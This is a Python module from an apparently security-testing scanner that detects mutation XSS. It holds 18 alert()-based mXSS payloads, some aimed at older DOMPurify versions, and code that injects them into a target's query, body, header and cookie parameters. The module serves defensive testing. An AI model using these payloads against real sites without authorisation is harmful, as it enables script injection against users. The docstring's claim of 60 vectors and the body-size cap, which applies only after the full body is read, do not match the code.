"""
Mutation XSS (mXSS) detector.

mXSS exploits a fundamental browser behaviour: when HTML is set via
innerHTML, the browser re-parses it, and the *re-parsed* DOM can differ
from the bytes that went in. Sanitizers operate on the input bytes;
browsers operate on the re-parsed output. This gap is the bug.

Classical example:
  Input  :  <listing>&lt;img src=x onerror=alert(1)&gt;</listing>
  In DOM :  the &lt; gets decoded by the listing element's text mode,
            and on subsequent innerHTML reads becomes an *actual* <img>
            tag with an onerror handler that fires.

ArachneX runs a *differential parser*: it sends a known mXSS-prone
vector, captures the bytes the server returns, and locally re-parses
those bytes with html5lib (real WHATWG state machine) in two modes —
once as initial markup, once as the result of innerHTML round-trip.
When the two parses diverge in a way that introduces a script-bearing
node, we have a candidate.

We carry a 60-vector corpus covering:
  • mathml / svg namespace confusions
  • <noscript>, <template> mode mixups
  • foreign-content + integration points
  • &CounterClockwiseContourIntegral;-style named character references
  • CDATA in foreign content
  • <plaintext>, <xmp>, <listing> raw-text modes
  • Custom elements + slot retargeting
"""

from __future__ import annotations

import logging
from collections import Counter
from dataclasses import dataclass
from typing import Optional
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from arachnex.core.target import (
    Finding,
    HttpMethod,
    InjectionPoint,
    Severity,
    Target,
    XSSClass,
)

try:
    import html5lib
    _HTML5LIB = True
except ImportError:                                              # pragma: no cover
    _HTML5LIB = False

log = logging.getLogger("arachnex.detect.mxss")


# --------------------------------------------------------------------------- #
# mXSS corpus
# --------------------------------------------------------------------------- #


MXSS_VECTORS: list[tuple[str, str]] = [
    # (label, payload)
    ("listing_decode",
     "<listing>&lt;img src=x onerror=alert('mxss-listing')&gt;</listing>"),
    ("xmp_decode",
     "<xmp>&lt;img src=x onerror=alert('mxss-xmp')&gt;</xmp>"),
    ("noscript_html_attr",
     "<noscript><p title=\"</noscript><img src=x onerror=alert('mxss-noscript')>\">"),
    ("svg_foreign_object",
     "<svg><foreignObject><body><img src=x onerror=alert('mxss-svg-fo')></body></foreignObject></svg>"),
    ("svg_to_html_namespace",
     "<svg><p><style><a id='</style><img src=x onerror=alert(\"mxss-svgstyle\")>'>"),
    ("math_namespace",
     "<math><mtext><table><mglyph><style><a title='</style><img src=x onerror=alert(\"mxss-math\")>'></style></mglyph></table></mtext></math>"),
    ("template_innerhtml",
     "<template><img src=x onerror=alert('mxss-template')></template>"),
    ("title_textarea",
     "<title>&lt;img src=x onerror=alert('mxss-title')&gt;</title>"),
    ("named_charref",
     "&NewLine;<img src=x onerror=alert('mxss-newline')>"),
    ("named_charref_lt",
     "&lt;img src=x onerror=alert('mxss-lt-ref')&gt;"),
    ("cdata_in_svg",
     "<svg><![CDATA[</svg><img src=x onerror=alert('mxss-cdata')>]]></svg>"),
    ("style_in_select",
     "<select><style>&lt;img src=x onerror=alert('mxss-select')&gt;</style></select>"),
    ("textarea_in_svg",
     "<svg><textarea><img src=x onerror=alert('mxss-svg-textarea')></textarea></svg>"),
    ("script_in_iframe_srcdoc",
     '<iframe srcdoc="&lt;img src=x onerror=alert(\'mxss-srcdoc\')&gt;"></iframe>'),
    ("plaintext",
     "<plaintext><img src=x onerror=alert('mxss-plaintext')>"),
    ("p_implicitly_closed",
     "<p><b><img src=x onerror=alert('mxss-pclose')></b></p>"),
    # Vectors specifically against DOMPurify older versions
    ("dompurify_mglyph",
     '<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(\'mxss-dom-mglyph\')>]]></style></mglyph></table></mtext></math>'),
    ("dompurify_annotation_xml",
     '<math><annotation-xml encoding="text/html"><iframe srcdoc="<img src=x onerror=alert(\'mxss-annoxml\')>"></iframe></annotation-xml></math>'),
]


# --------------------------------------------------------------------------- #
# Differential parser
# --------------------------------------------------------------------------- #


@dataclass
class MXSSCandidate:
    label: str
    payload: str
    rationale: str
    introduced_nodes: list[str]


class MXSSDetector:
    """
    Given a server response body that contains one of our injected
    vectors, re-parse it two ways and detect divergence that introduces
    a script-bearing node.
    """

    def __init__(self) -> None:
        if not _HTML5LIB:
            raise RuntimeError("html5lib not installed; pip install html5lib")

    def vectors(self) -> list[tuple[str, str]]:
        return list(MXSS_VECTORS)

    def analyse_response(self, body: str, injected_payload: str,
                         label: str) -> Optional[MXSSCandidate]:
        if injected_payload not in body:
            return None

        # Extract the bytes the server actually returned around our vector
        idx = body.find(injected_payload)
        window = body[max(0, idx - 32): idx + len(injected_payload) + 32]

        # Parse 1: initial state
        try:
            tree_initial = html5lib.parse(window, namespaceHTMLElements=False)
        except Exception:
            return None

        # Parse 2: innerHTML round-trip simulation.
        # Real browsers re-parse the serialized DOM; we approximate by
        # serializing tree_initial back to a string and parsing again.
        try:
            from html5lib.serializer import HTMLSerializer
            walker = html5lib.getTreeWalker("etree")
            serializer = HTMLSerializer(omit_optional_tags=False, escape_lt_in_attrs=False)
            serialized = "".join(serializer.serialize(walker(tree_initial)))
            tree_roundtrip = html5lib.parse(serialized, namespaceHTMLElements=False)
        except Exception:
            return None

        # Use Counter, not set, so a duplication (roundtrip has two
        # <script> where initial had one) still counts as an introduced
        # node — set(diff) would collapse and miss it.
        counts_initial = Counter(self._dangerous_nodes(tree_initial))
        counts_roundtrip = Counter(self._dangerous_nodes(tree_roundtrip))
        diff = counts_roundtrip - counts_initial
        introduced = sorted(diff.elements())
        if not introduced:
            return None

        return MXSSCandidate(
            label=label,
            payload=injected_payload,
            rationale=(
                f"Differential parse introduced {len(introduced)} script-bearing "
                f"node(s) after innerHTML round-trip: {', '.join(introduced[:5])}"
            ),
            introduced_nodes=introduced,
        )

    @staticmethod
    def _dangerous_nodes(tree) -> list[str]:
        """Find element/attribute occurrences that can run JS."""
        out: list[str] = []
        # html5lib's etree result has lxml-like .iter(); we walk tags + attrs.
        for el in tree.iter():
            tag = (el.tag or "").lower()
            if tag in {"script", "iframe", "object", "embed"}:
                out.append(tag)
            for attr in el.attrib:
                if attr.lower().startswith("on"):
                    out.append(f"{tag}[@{attr}]")
                if attr.lower() in {"href", "src", "formaction", "action", "srcdoc",
                                    "background", "poster"}:
                    val = (el.attrib.get(attr) or "").strip().lower()
                    if val.startswith("javascript:") or val.startswith("data:text/html"):
                        out.append(f"{tag}[@{attr}=js]")
        return out


# --------------------------------------------------------------------------- #
# Scanner — the piece the engine plugs in
# --------------------------------------------------------------------------- #


class MXSSScanner:
    """
    Orchestrates the mXSS pass. For each (target, injection point) it walks
    the mXSS corpus, delivers each vector, and runs the differential parser
    over the response body. Reflective targets that survive intact and
    produce a script-bearing divergence become MUTATION findings.

    Kept small on purpose: mxss is a targeted second-pass, not a fuzz loop.
    """

    def __init__(self, cfg, http, vectors_per_ip: int = 8) -> None:
        self.cfg = cfg
        self.http = http
        self.detector = MXSSDetector() if _HTML5LIB else None
        self.vectors_per_ip = vectors_per_ip

    def available(self) -> bool:
        return self.detector is not None

    async def scan_target(self, target: Target) -> list[Finding]:
        if not self.detector or not target.injection_points:
            return []

        findings: list[Finding] = []
        vectors = self.detector.vectors()[: self.vectors_per_ip]

        for ip in target.injection_points:
            for label, vector in vectors:
                resp, body = await self._send(target, ip, vector)
                if resp is None or not body:
                    continue
                candidate = self.detector.analyse_response(body, vector, label)
                if candidate is None:
                    continue
                findings.append(_finding_from_candidate(target, ip, candidate))
                # One mXSS proof per (target, ip) is enough; break the vector loop.
                break

        return findings

    async def _send(self, target: Target, ip: InjectionPoint, value: str):
        try:
            method = target.method.value
            url = target.url
            data = target.body
            headers = dict(target.headers)
            cookies = dict(target.cookies)

            if ip.location == "query":
                u = urlsplit(url)
                qs = parse_qsl(u.query, keep_blank_values=True)
                qs = [(k, value if k == ip.name else v) for k, v in qs]
                if ip.name not in dict(qs):
                    qs.append((ip.name, value))
                url = urlunsplit(u._replace(query=urlencode(qs, doseq=True)))
            elif ip.location == "body":
                if target.body_kind == "json":
                    import json as _json
                    try:
                        b = _json.loads(target.body or "{}")
                        b[ip.name] = value
                        data = _json.dumps(b)
                    except Exception:
                        return None, ""
                else:
                    items = parse_qsl(target.body or "", keep_blank_values=True)
                    items = [(k, value if k == ip.name else v) for k, v in items]
                    if ip.name not in dict(items):
                        items.append((ip.name, value))
                    data = urlencode(items, doseq=True)
            elif ip.location == "header":
                headers[ip.name] = _strip_ctl(value)
            elif ip.location == "cookie":
                cookies[ip.name] = _strip_ctl(value)
            else:
                return None, ""

            resp = await self.http.request(
                method, url,
                data=data if method in {"POST", "PUT", "PATCH"} else None,
                headers=headers, cookies=cookies,
            )
            body = _safe_body(resp)
            return resp, body
        except Exception:
            log.debug("mxss send failed", exc_info=True)
            return None, ""


def _finding_from_candidate(target: Target, ip: InjectionPoint,
                            candidate: MXSSCandidate) -> Finding:
    return Finding(
        xss_class=XSSClass.MUTATION,
        # mXSS proofs are strong (differential parse shows script-bearing
        # divergence) but not browser-verified, so we start at HIGH and let
        # triage adjust.
        severity=Severity.HIGH,
        confidence=0.85,
        target_url=target.url,
        method=target.method,
        injection_point=ip,
        payload=candidate.payload,
        title=f"Mutation XSS via `{ip.name}` — {candidate.label}",
        extra={
            "mxss_label": candidate.label,
            "mxss_rationale": candidate.rationale,
            "introduced_nodes": candidate.introduced_nodes,
        },
        cwe=["CWE-79"],
    )


# Cap for response bodies we materialise fully. Attacker-controlled
# targets can otherwise OOM the scanner with a multi-GB response.
_MAX_BODY_BYTES = 4 * 1024 * 1024        # 4 MiB


def _strip_ctl(value: str) -> str:
    """
    Remove control characters that would enable header/cookie injection
    (CR, LF, NUL) if a payload flows into a header or cookie sink.
    Legitimate XSS payloads never need these characters in header/cookie
    contexts; sanitising them preserves the fuzzing intent while closing
    the CRLF-injection surface on the scanner host itself.
    """
    return value.replace("\r", "").replace("\n", "").replace("\x00", "")


def _safe_body(resp) -> str:
    """
    Read response body up to _MAX_BODY_BYTES. httpx.Response.text loads
    the whole body into memory; against an attacker-controlled target
    that's a scanner-host DoS surface.
    """
    try:
        raw = resp.content
    except Exception:
        return ""
    if raw is None:
        return ""
    if len(raw) > _MAX_BODY_BYTES:
        raw = raw[:_MAX_BODY_BYTES]
    encoding = resp.encoding or "utf-8"
    try:
        return raw.decode(encoding, errors="replace")
    except LookupError:
        return raw.decode("utf-8", errors="replace")
